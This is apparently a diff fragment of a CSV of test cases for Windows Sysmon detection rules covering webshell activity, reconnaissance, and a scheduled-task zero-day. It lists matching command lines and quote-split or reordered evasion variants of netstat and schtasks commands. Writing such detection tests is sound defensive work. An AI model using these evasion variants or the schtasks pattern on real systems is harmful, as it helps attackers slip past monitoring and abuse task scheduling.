+win_webshell_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net""stat"
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Match_04.json,ping -n 10
+win_webshell_detection,Microsoft-Windows-Sysmon_1_Match_02.json,schtasks
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,wget -h
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,python -h
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,python.exe --help
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Match_01.json,perl --help
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Match_03.json,wget --help
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,python -h
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Match_04.json,perl -h
+win_webshell_recon_detection,Microsoft-Windows-Sysmon_1_Match_02.json,python --help
+win_win10_sched_task_0day,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,schtasks /TN taskname /RU user /RP password /change
+win_win10_sched_task_0day,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,schtasks /RP password /RU user /change /TN taskname
+win_win10_sched_task_0day,Microsoft-Windows-Sysmon_1_Match_01.json,schtasks /change /TN taskname /RU user /RP password
+win_win10_sched_task_0day,Microsoft-Windows-Sysmon_1_Match_03.json,schtasks /change /TN taskname /ru user /rp password
+win_win10_sched_task_0day,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,schtasks /change /TN taskname /RP password /RU user
+win_win10_sched_task_0day,Microsoft-Windows-Sysmon_1_Match_02.json,schtasks /change /tn taskname /ru user /rp password
